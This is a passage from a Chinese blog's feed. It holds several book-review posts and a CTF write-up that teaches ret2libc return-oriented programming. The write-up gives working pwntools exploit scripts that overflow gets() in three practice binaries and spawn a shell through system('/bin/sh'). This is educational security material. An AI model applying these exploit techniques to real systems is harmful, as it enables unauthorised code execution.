style="zoom:80%;"></p><p><strong>满纸荒唐言，一把辛酸泪。都云作者痴，谁解其中味？</strong></p><p>《红楼梦》是一部百科全书式的长篇小说。以宝黛爱情悲剧为主线，以四大家族的荣辱兴衰为背景，描绘出18世纪中国封建社会的方方面面，以及封建专制下新兴资本主义民主思想的萌动。结构宏大、情节委婉、细节精致，人物形象栩栩如生，声口毕现，堪称中国古代小说中的经典。</p><p>goat级别的书～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;月亮与六便士&quot;&gt;&lt;a href=&quot;#月亮与六便士&quot; class=&quot;headerlink&quot; title=&quot;月亮与六便士&quot;&gt;&lt;/a&gt;月亮与六便士&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/08/27/读书分享V/1.jpg&quot; alt=&quot;1&quot; style=&quot;zoom
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>ROP学习II</title>
    <link href="elssm.github.io/2023/07/13/ROP%E5%AD%A6%E4%B9%A0II/"/>
    <id>elssm.github.io/2023/07/13/ROP学习II/</id>
    <published>2023-07-13T06:24:14.000Z</published>
    <updated>2023-10-09T12:53:52.584Z</updated>
    
    <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>上一节通过一个简单的<code>ret2syscall</code>题目认识了ROP。本节将通过三道<code>ret2libc</code>题目继续学习ROP。</p><p>学习<code>ret2libc</code>题目之前需要对<code>plt</code>和<code>got</code>有一定的了解。</p><p>GOT全称<code>Global Offset Table</code>，即全局偏移量表。它在可执行文件中是一个单独的section，位于<code>.data</code> section的前面。每个被目标模块引用的全局符号（函数或者变量）都对应于GOT中一个8字节的条目。编译器还为GOT中每个条目生成一个重定位记录。在加载时，动态链接器会重定位GOT中的每个条目，使得它包含正确的目标地址。</p><p>PLT全称<code>Procedure Linkage Table</code>，即过程链接表。它在可执行文件中也是一个单独的section，位于<code>.text</code>section的前面。每个被可执行程序调用的库函数都有它自己的PLT条目。每个条目实际上都是一小段可执行的代码。</p><p>通过下图说明。当第一次调用func函数时。会跳转到该函数对应的PLT处。该函数对应的PLT第一条指令执行它对应的.GOT.PLT里的指令。第一次调用时，该函数的.GOT.PLT里保存的是它对应的PLT里第二条指令的地址；继续执行PLT第二条、第三条指令，其中第三条指令作用是跳转到公共的PLT（.PLT[0]）。 公共的PLT（.PLT[0]）执行.GOT.PLT[2]指向的代码，也就是执行动态链接器的代码；动态链接器里的<code>_dl_runtime_resolve_avx</code>函数修改被调函数对应的.GOT.PLT里保存的地址，使之指向链接后的动态链接库里该函数的实际地址；再次调用该函数对应的PLT第一条指令，跳转到它对应的.GOT.PLT里的指令（此时已经是该函数在动态链接库中的真正地址），从而实现该函数的调用。</p><p><img src="/2023/07/13/ROP学习II/1.png" alt="1"></p><h4 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h4><p>本题需要通过gets函数溢出，利用程序中的<code>system</code>函数和<code>/bin/sh</code>字符串获取权限。</p><p>通过<code>strings</code>判断程序中是否存在<code>system</code>函数和<code>/bin/sh</code>字符串。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep system</span><br><span class="line">system</span><br><span class="line">system@@GLIBC_2.0</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop# strings ret2libc1 | grep /bin/sh</span><br><span class="line">/bin/sh</span><br></pre></td></tr></table></figure><p>检查保护，发现开启了NX防护，这意味着我们不能在堆栈中执行shellcode。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br></pre></td></tr></table></figure><p>程序反汇编如下</p><p><img src="/2023/07/13/ROP学习II/2.png" alt="2"></p><p>这里我们的具体方法是，通过gets函数传参数溢出。使得<code>main</code>函数能够return到<code>system</code>函数的地址，并将<code>/bin/sh</code>字符串地址传入到<code>system</code>函数中。</p><p>那么如何获取<code>system</code>函数和<code>/bin/sh</code>字符串在程序中的地址呢？</p><p>我们可以通过程序获取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">[*] <span class="string">'/root/pwn/rop/ret2libc1'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>elf.plt[<span class="string">"system"</span>]</span><br><span class="line"><span class="number">134513760</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134513760</span>)</span><br><span class="line"><span class="string">'0x8048460'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>next(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="number">134514464</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">134514464</span>)</span><br><span class="line"><span class="string">'0x8048720'</span></span><br></pre></td></tr></table></figure><p>接着我们通过gdb动态调试计算需要溢出的数据大小。通过<code>stack</code>命令查看eax到ebp的距离。</p><p><img src="/2023/07/13/ROP学习II/3.png" alt="3"></p><p>需要溢出的数据大小为<code>0xffffd5b8 - 0xffffd54c</code>再加上四字节ebp一共112字节。</p><p>ROP链构造如下</p><p><img src="/2023/07/13/ROP学习II/6.png" alt="6"></p><p>之后我们可以构造exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">binsh_addr = <span class="number">0x8048720</span></span><br><span class="line">system_plt = <span class="number">0x8048460</span></span><br><span class="line">payload = <span class="string">b'A'</span>*<span class="number">112</span> + p32(system_plt) + <span class="string">b'B'</span>*<span class="number">4</span> + p32(binsh_addr)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>执行程序获取shell</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop<span class="comment"># python3 exp_ret2libc1.py</span></span><br><span class="line">[+] Starting local process <span class="string">'./ret2libc1'</span>: pid <span class="number">16491</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">$ pwd</span><br><span class="line">/root/pwn/rop</span><br></pre></td></tr></table></figure><h4 id="ret2libc2"><a href="#ret2libc2" class="headerlink" title="ret2libc2"></a>ret2libc2</h4><p>本题和<code>ret2libc1</code>的区别是，程序中没有<code>/bin/sh</code>，需要我们自己将<code>/bin/sh</code>字符串写入到程序中进行控制。</p><p>通过反汇编查看我们应该将<code>/bin/sh</code>写入到bss段的<code>buf2</code>中。</p><p><img src="/2023/07/13/ROP学习II/4.png" alt="4"></p><p>所以我们的思路是首先ROP到gets函数，在gets函数中将<code>/bin/sh</code>读取并放入<code>buf2</code>。之后继续ROP到<code>system@plt</code>即可。</p><p>ROP链构造如下</p><p><img src="/2023/07/13/ROP学习II/5.png" alt="5"></p><p>exp构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc2"</span>)</span><br><span class="line">buf2 = elf.symbols[<span class="string">"buf2"</span>]</span><br><span class="line">gets_plt = elf.plt[<span class="string">"gets"</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">io.recv()</span><br><span class="line">payload = <span class="number">112</span>*<span class="string">b'A'</span> + p32(gets_plt) + p32(system_plt) + p32(buf2) + p32(buf2)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">b"/bin/sh\x00"</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="ret2libc3"><a href="#ret2libc3" class="headerlink" title="ret2libc3"></a>ret2libc3</h4><p>本题程序中没有<code>system</code>函数也没有<code>/bin/sh</code>字符串，但是提供了<code>so</code>文件。对于<code>/bin/sh</code>字符串我们可以用前面的方法写入，但system函数是无法写入的。</p><p>然而在linux延迟绑定机制中，当程序调用库函数时，会将<code>libc.so</code>文件中的函数地址写到程序的got表中，调用时会跳转到got表所写的地址。那么我们如果要调用system函数，就要知道他的got表中的地址，got表中的地址指的就是当系统将libc（动态链接库）加载到内存中时，库中的函数的地址。但libc被加载到的内存的位置是随机的，我们无从得知。<br>但是，同一版本的libc的两个库函数在libc中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的got表地址，然后确定libc的版本，就可以加上和system函数的偏移，从而得到system函数的真实地址，即got表地址。<br>这里我们拥有一个puts函数，我们可以用puts函数，将一个已经执行过的函数的got表地址打印出来，然后再根据地址获取libc版本，确定偏移，得到真实地址。</p><p><img src="/2023/07/13/ROP学习II/8.png" alt="8"></p><p>首先strings看一下程序中的<code>/bin/sh</code>字符串，没有找到<code>/bin/sh</code>字符串，可以用<code>sh</code>代替，效果是一样的。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep /bin/sh</span><br><span class="line">root@iZf8zhvvgpaxwofuk3ccedZ:~/pwn/rop/ret2libc3# strings ret2libc3 | grep sh</span><br><span class="line">fflush</span><br><span class="line">.shstrtab</span><br><span class="line">.gnu.hash</span><br><span class="line">fflush@@GLIBC_2.0</span><br></pre></td></tr></table></figure><p>因此ROP链构造如下</p><p><img src="/2023/07/13/ROP学习II/7.png" alt="7"></p><p>溢出数据大小通过反编译查看，得到大小为<code>56+4=60</code>字节</p><p><img src="/2023/07/13/ROP学习II/9.png" alt="9"></p><p>接着我们需要知道<code>system</code>函数在程序中的真实地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"libc-2.23.so"</span>)</span><br><span class="line">system@plt address  = libc.symbols[<span class="string">"system"</span>] - libc.symbols[<span class="string">"puts"</span>] + puts_plt</span><br></pre></td></tr></table></figure><p>最终exp构造如下构造如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc3"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>) <span class="comment">#通过ldd找到程序在本机的libc地址</span></span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,str(elf.got[<span class="string">"puts"</span>])) <span class="comment">#传入的是字符串</span></span><br><span class="line">io.recvuntil(<span class="string">b" : "</span>)</span><br><span class="line">puts_plt = int(io.recvuntil(<span class="string">b"\n"</span>,drop = <span class="literal">True</span>),<span class="number">16</span>) <span class="comment">#得到puts函数的真实地址</span></span><br><span class="line">success(<span class="string">"puts_plt -&gt; &#123;:#x&#125;"</span>.format(puts_plt))</span><br><span class="line">payload = flat(cyclic(<span class="number">60</span>),puts_plt+libc.symbols[<span class="string">"system"</span>]-libc.symbols[<span class="string">"puts"</span>],<span class="number">0xdeadbeef</span>,next(elf.search(<span class="string">b"sh\x00"</span>)))</span><br><span class="line">io.sendlineafter(<span class="string">b" :"</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.bilibili.com/video/BV1854y1y7Ro" target="_blank" rel="noopener">https://www.bilibili.com/video/BV1854y1y7Ro</a></p><p><a href="https://www.freebuf.com/articles/web/283330.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/283330.html</a></p><p><a href="https://luomuxiaoxiao.com/?p=578" target="_blank" rel="noopener">https://luomuxiaoxiao.com/?p=578</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;上一节通过一个简单的&lt;code&gt;ret2syscall&lt;/code&gt;题目认识了ROP。本节将通过三道&lt;code&gt;ret2libc&lt;/code
      
    
    </summary>
    
    
      <category term="ctf" scheme="elssm.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>读书分享IV</title>
    <link href="elssm.github.io/2023/05/09/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABIV/"/>
    <id>elssm.github.io/2023/05/09/读书分享IV/</id>
    <published>2023-05-09T11:23:10.000Z</published>
    <updated>2023-10-09T12:17:16.220Z</updated>
    
    <content type="html"><![CDATA[<h4 id="楚汉双雄"><a href="#楚汉双雄" class="headerlink" title="楚汉双雄"></a>楚汉双雄</h4><p><img src="/2023/05/09/读书分享IV/1.jpg" alt="1" style="zoom:80%;"></p><p><strong>见识这东西，其实说到底，就是在大量的理论和实际结合与融会贯通后，明白了事物发展、运行的规律。</strong><br>作为一本历史书，它很特别：角度史无前例。通过楚汉争霸时期9场著名战役来讲述这段历史，权力斗争、兵法谋略、群雄汇聚、尽显人性；作为一本历史书，它通俗又有深度：不追热点，没有八卦，从解构历史的底层逻辑入手，内容深刻且全面透彻。全系列作品从先秦时期讲到清朝末年，贯穿2300年中国历史；作为一本历史书，它曾一度难产：保证原汁原味的同时，兼顾史实考证。为了保证内容还原史实现场，它经过了无数次的审读修改。为了想尽各种办法，让读者阅读体验更直观，配经典手绘作战图五十余幅，反复修改，力求准确；作为一本历史书，它从解构历史的底层逻辑入手：详细回答每一个之前我们看历史时皱眉头、无法说通的关键点。</p><h4 id="动物农场"><a href="#动物农场" class="headerlink" title="动物农场"></a>动物农场</h4><p><img src="/2023/05/09/读书分享IV/2.jpg" alt="2" style="zoom:50%;"></p><p><strong>你们有你们的低等动物需要对付，我们有我们的下层阶级需要摆平！</strong></p><p>《动物农场》是奥威尔最优秀的作品之一，是一则入木三分的反乌托的政治讽喻寓言。农场的一群动物成功地进行了一场“革命”，将压榨他们的人类东家赶出农场，建立起一个平等的动物社会。然而，动物领袖，那些聪明的猪们最终却篡夺了革命的果实，成为比人类东家更加独裁和极权的统治者。</p><p>神作了属于是。乔治奥威尔yyds！</p><h4 id="小巷人家"><a href="#小巷人家" class="headerlink" title="小巷人家"></a>小巷人家</h4><p><img src="/2023/05/09/读书分享IV/3.jpg" alt="3" style="zoom:50%;"></p><p><strong>再焦虑，再担心，日子还是照常过，时间在柴米油盐中不动声色地向前流淌</strong></p><p>《小巷人家》收集作者近几年写的散文、随笔、诗歌、杂文等近50篇。部分作品在《南方周末》《新安晚报》《宣城日报》《宣城电视报》和《敬亭山》等处发表过。这些文字主要是作者写自己、家人、亲友、同事，回忆家乡，感悟生活，抒发平日生活和工作中的感悟和随想。作者取材自由，笔法灵活，通过随笔散文抒发出他对生活的感受，率真清晰地展示出他的精神世界，机动灵活地彰显出他的个性才情，从而自由地表达出作者的内心世界。该文集文笔优美，内容积极向上，作者通过对生活的真实感悟，写出生活中的真善美，讴歌人世间至真至纯的亲情、友情和爱情。文字风格介于农村和城市之间，既保存了纯朴的内核，也反映了城市化的文明投影。</p><p>写的很温馨，喜欢这种纯粹的情感，真心希望能被拍成电视剧！</p><h4 id="微尘"><a href="#微尘" class="headerlink" title="微尘"></a>微尘</h4><p><img src="/2023/05/09/读书分享IV/4.jpg" alt="4" style="zoom:80%;"></p><p><strong>读懂上一代人残缺又丰富的人生，才是下一代人最基础的课程</strong></p><p>本书收录了陈年喜21篇非虚构故事集。书中写了一群平凡而朴素的劳动者的故事。他们是爆破工、运石工、乡村木匠、农夫、农妇、小作坊老板……而作家自己的故事，贯穿始终：在地下五千米开山炸石，在烟尘和轰鸣中养家糊口，在工棚和山野中写下诗篇，记录命运的爆裂和寂静。他们虽历经生活的磨砺，却淳朴而硬扎，沉静地诉说关于亲情、爱情、死亡、欲望的生活主题……这是一本生命的书，也是死亡的书，归根到底，是一本生活的书。世界是什么样子？生活是什么样子？我的感觉里，除了绵长、无处不在的风，其余都是尘埃，我们在其中奔突，努力站稳，但更多的时候是东倒西歪，身不由己。</p><p>微尘，我们每个人都是一粒微尘，随世漂流。</p><h4 id="罪与罚"><a href="#罪与罚" class="headerlink" title="罪与罚"></a>罪与罚</h4><p><img src="/2023/05/09/读书分享IV/5.jpg" alt="5" style="zoom:50%;"></p><p><strong>一个人想要帮助别人，首先他得有权利这样做</strong></p><p>小说描写穷大学生拉斯柯尔尼科夫为生计所迫，受无政府主义思想毒害，精神失常，杀死放高利贷的房东老太婆和她的无辜的妹妹，制造了一起震惊全俄的凶杀案，最终在基督徒索尼雅姑娘的规劝下，投案自首，被判流放西伯利亚。作品着重刻画主人公犯罪前后的心里变化，揭示俄国下层人民的艰难生活。</p><p>这本书对于人物的心理描写写的是真的好，就是人物名字一个个都挺长的，有时候记不住。</p><h4 id="面纱"><a href="#面纱" class="headerlink" title="面纱"></a>面纱</h4><p><img src="/2023/05/09/读书分享IV/6.jpg" alt="6" style="zoom:30%;"></p><p><strong>只有一种办法能赢得众人的心，那就是让人们认为你是应该被爱的</strong></p><p>容貌娇美而又爱慕虚荣的英国女子凯蒂，为了避免自己变成一位老姑娘，接受了生性孤僻的医生瓦尔特·费恩的求婚。她离开了上世纪20年代伦敦浮华而空虚的社交圈，随瓦尔特远赴神秘的东方殖民地——香港。对婚姻感到不满和无趣，凯蒂开始悄悄与令她芳心摇动的香港助理布政司查理·唐生偷情。面对不忠的妻子，瓦尔特决定举家前往霍乱横行的中国内地行医。在遥远美丽的异乡，他们每天与死亡和绝望擦身而过，经历了从未体验过的情感波澜……在爱情、背叛与死亡的漩涡中挣扎的凯蒂，亲历了幻想破灭与生死离别之后，终将生活的面纱从她的眼前渐渐揭去，从此踏上了不悔的精神成长之路。</p><p>毛姆的故事从来都和爱情无关，所有划过时间的醉心经历，所有如履薄冰的内心煎熬，最后都成为一条探索自我内心的路，划开生活的表皮，谁也不需要救赎，充盈的人可以血淋淋的死去，淡漠的人最终学会真正的淡漠。</p><h4 id="山河故人"><a href="#山河故人" class="headerlink" title="山河故人"></a>山河故人</h4><p><img src="/2023/05/09/读书分享IV/7.jpg" alt="7" style="zoom:50%;"></p><p><strong>家人闲坐，灯火可亲</strong></p><p>本书完备地收录了汪曾祺怀人忆旧系列散文。在书中，我们将认识作者儿时的家庭成员和学校教员、故乡的街巷店铺和坊间奇人，还有昔日西南联大那些气质各异的师生以及在战乱年代仍有趣地生活着的人们。书中也收入了作者谈沈从文的多篇文字，从中可以窥见20世纪中国两位文学大师之间深挚动人的情谊……</p><p>那些回不去的时光，都是举世无双的好时光。曾经在记忆里的那些故人，希望都能各自安好！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;楚汉双雄&quot;&gt;&lt;a href=&quot;#楚汉双雄&quot; class=&quot;headerlink&quot; title=&quot;楚汉双雄&quot;&gt;&lt;/a&gt;楚汉双雄&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/2023/05/09/读书分享IV/1.jpg&quot; alt=&quot;1&quot; style=&quot;zoom:80%;&quot;&gt;
      
    
    </summary>
    
    
      <category term="随笔" scheme="elssm.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>读书分享III</title>
    <link href="elssm.github.io/2023/02/27/%E8%AF%BB%E4%B9%A6%E5%88%86%E4%BA%ABIII/"/>
    <id>elssm.github.io/2023/02/27/读书分享III/</id>
    <published>2023-02-27T13:38:32.000Z</published>
    <updated>2023-10-09T12:21:27.299Z</updated>
    
    <content type="html"><![CDATA[<h4 id="长安的荔枝"><a href="#长安的荔枝" class="headerlink" title="长安的荔枝"></a>长安的荔枝</h4><p><img src="/2023/02/27/读书分享III/1.png" alt="1" style="zoom:50%;"></p><p><strong>就算失败，我也想知道，自己倒在距离终点多远的地方。</strong></p><p>大唐天宝十四年，长安城的小吏李善德突然接到一个任务：要在贵妃诞日之前，从岭南运来新鲜荔枝。荔枝“一日色变，两日香变，三日味变”，而岭南距长安五千余里，山水迢迢，这是个不可能完成的任务，可为了家人，李善德决心放手一搏：“就算失败，我也想知道，自己倒在距离终点多远的地方。”唐朝诗人杜牧的一句“一骑红尘妃子笑，无人知是荔枝来”一千多年来引发了人们的无限遐想，但鲜荔枝的保鲜时限仅有三天，这场跨越五千余里的传奇转运之旅究竟是如何达成的，谁让杨贵妃在长安吃到了来自岭南的鲜荔枝？作者马伯庸就此展开了一场脑洞非常大的想象。</p><p>四个小时读完了这本书。当锅甩到你身上的时候，你还能怎么办呢？？？</p><p>上面一句话，下面跑断腿。为了远在长安的贵人想吃一口新鲜荔枝，几十年的荔枝果园尽数被毁，农民不堪赋税背井离乡，骑手马匹竭力日夜兼程运送赶路，涉险渡江，马匹横死。这已经不是简单的人力物力财力这几个词可以概括的，这背后是果农的血泪，底层官员的挣扎。而最终这一场接力路程，浩浩荡荡的出发队伍，能够走到长安的，仅一人，一骑。其余死在路上的累倒在路上的，有谁，有多少人，无人在意，反正贵人是很开心的。一骑红尘妃子笑，无人知是荔枝来。全书紧锣密鼓节奏紧凑，阅读过程畅快淋漓，置之死地而后生，处处亮点处处梗，以一个小人物的视角窥视了大厦将倾的唐朝盛世。（摘自豆瓣）</p><h4 id="务虚笔记"><a href="#务虚笔记" class="headerlink" title="务虚笔记"></a>务虚笔记</h4><p><img src="/2023/02/27/读书分享III/2.png" alt="2" style="zoom:50%;"></p><p><strong>有区别才有自己，自己就是区别；有距离才有路，路就是距离。</strong></p><p>《务虚笔记》是轮椅上的史铁生的首部长篇小说，也是他半自传式的作品。隔着咫尺的空间与浩瀚的时间，作家将带着读者凝望生命的哀艳与无常，体味历史的丰饶与短暂。这是作者的长篇小说处女作，行文优美、凝练，情感真挚、厚重，且好读，处处透映着一种对人世沧桑的如泣如诉、似幽似怨的伤感与领悟。</p><h4 id="人性的枷锁"><a href="#人性的枷锁" class="headerlink" title="人性的枷锁"></a>人性的枷锁</h4><p><img src="/2023/02/27/读书分享III/3.png" alt="3" style="zoom:50%;"></p><p><strong>又操心今天，又发愁明天。那活着还有什么意义呢？当你过不下去的时候，自然会有出路。</strong></p><p>《人性的枷锁》是毛姆具有自传性质的经典作品，也被认为是首屈一指、流传甚广的重要代表作。和《月亮和六便士》《面纱》《刀锋》一道，奠定毛姆“故事圣手”基础和文学史独特地位。故事以毛姆亲身经历为蓝本，描述了身有残疾的主人公菲利普从孤儿到长大的完整过程，亲情、爱情、友情，校园、艺术、理想，在重重枷锁中，苦寻自由而难得，最终发现这都是人性的本来面目。是否能摆脱这人性的枷锁？什么是长大，什么是成熟？答案在风中飘，带着笑和泪。</p><p>这本书中将人性描写的简直不能再真实，100多年前的观点现在来看依然不过时。从一开始被各种安排到最后冲破枷锁。菲利普是幸运的。从牧师到会计到画家再到医生，菲利普是有才的。或许每个人都能在能菲利普身上看到80%的自己。</p><h4 id="正红旗下"><a href="#正红旗下" class="headerlink" title="正红旗下"></a>正红旗下</h4><p><img src="/2023/02/27/读书分享III/4.png" alt="4" style="zoom:50%;"></p><p><strong>我们创造了一种独具风格的生活方式：有钱的真讲究，没钱的穷讲究。 生命就这么沉浮在有讲究的一汪死水里 他们的一生，像做作着一个细巧的，明白而又有点糊涂的梦</strong></p><p>《正红旗下》是老舍未完自传体长篇小说遗作，手稿共十一章，一百六十四页。一九六六年八月二十四日，老舍自沉于北京太平湖，这部作品与他的人生，戛然而止。老舍为旗人，隶属“满洲八旗”的“正红旗”，这也是书名的由来。老舍从“我”出生写起，当时正是清朝末年，社会动荡，民生凋敝。眼看着大 清王朝走向没落，养尊处优的八旗子弟们也在末路挣扎……随着义和团兴起，洋人到来，北京老百姓平静的生活被打破，一个个人物在老舍笔下栩栩如生：老实巴交的父亲、善良正直的王掌柜、尖酸刻薄的姑母、聪明能干的福海二哥、妄自尊大的牛牧师……这些身处在动荡历史洪流中的大清子民，都走向了不同的命运……</p><p>定大爷的饭局刚开始，结局戛然而止。</p><p>1966年8月24日午夜，老舍先生自沉太平湖。这部作品与他的人生，戛然而止。</p><h4 id="我叫刘跃进"><a href="#我叫刘跃进" class="headerlink" title="我叫刘跃进"></a>我叫刘跃进</h4><p><img src="/2023/02/27/读书分享III/5.png" alt="5" style="zoom:50%;"></p><p><strong>深渊有底，人心难测。</strong></p><p>《我叫刘跃进》由刘震云编著。讲述了：刘跃进是北京某建筑工地的民工，上街时他的包被人抢了，里面装着他全部财产。找包的过程中，他又捡到一个包，这个包里藏着天大的秘密，牵涉到上流社会的几条人命。于是几拨找这个包的人马，又开始找刘跃进…… 刘跃进像一只无辜的羊，意外地闯入了狼群，他自认倒霉却不悲观。问题在于，世界上所有的狼，都披着羊皮，和蔼可亲；而世界上所有的羊又在装大尾巴狼，装腔作势。</p><p>这本书真是看了就停不下来。。。环环相扣，一气呵成。两个包、一个欠条、一个u盘串联了书中的所有人物。也应了那句话：是非只因多开口，烦恼总为强出头。</p><h4 id="丰乳肥臀"><a href="#丰乳肥臀" class="headerlink" title="丰乳肥臀"></a>丰乳肥臀</h4><p><img src="/2023/02/27/读书分享III/6.png" alt="6" style="zoom:50%;"></p><p><strong>受伤的麦子，有的直起腰，有的永远直不起腰</strong></p><p>《丰乳肥臀》是中国当代作家莫言创作的长篇小说 。小说热情讴歌了生命最原初的创造者——母亲的伟大、朴素与无私，生命的沿袭的无与伦比的重要意义。并且在这一幅生命的流程图中，弥漫着历史与战争的硝烟，真实，不带任何偏见，再现了一段时期内的历史。</p><p>一部家族的苦难史，一部民族的苦难史，一个懦弱男人的成长史！</p><h4 id="结构性改革"><a href="#结构性改革" class="headerlink" title="结构性改革"></a>结构性改革</h4><p><img src="/2023/02/27/读书分享III/7.jpeg" alt="7" style="zoom:50%;"></p><p>恰逢百年未有之大变局，经济转型发展、中美贸易摩擦、新冠疫情暴发等问题交相叠加，无不考验着我国面对复杂问题的智慧和勇气，供给侧结构性改革的重要性与紧迫性空前凸显。这本书从基础性、结构性、机制性、制度性等多个维度，深入剖析我国供给侧关键矛盾并对症下药。全书一共七章。第一章详解如何紧抓供给侧结构性改革主线；第二章聚焦去杠杆与金融风险防范；第三章解读新时代下我国资本市场高质量发展之路；第四章讲述“数字化”如何重塑经济社会生态；第五章对房地产长效调控机制开出药方，并预判今后十年房地产行业六大趋势；第六章着眼于国有企业资本运作与地方政府营商环境改善；第七章阐释新局面、新特征下，我国对国际形势与中美关系的应对之道，深入剖析“双循环”新格局。</p><h4 id="沧浪之水"><a href="#沧浪之水" class="headerlink" title="沧浪之水"></a>沧浪之水</h4><p><img src="/2023/02/27/读书分享III/8.png" alt="8" 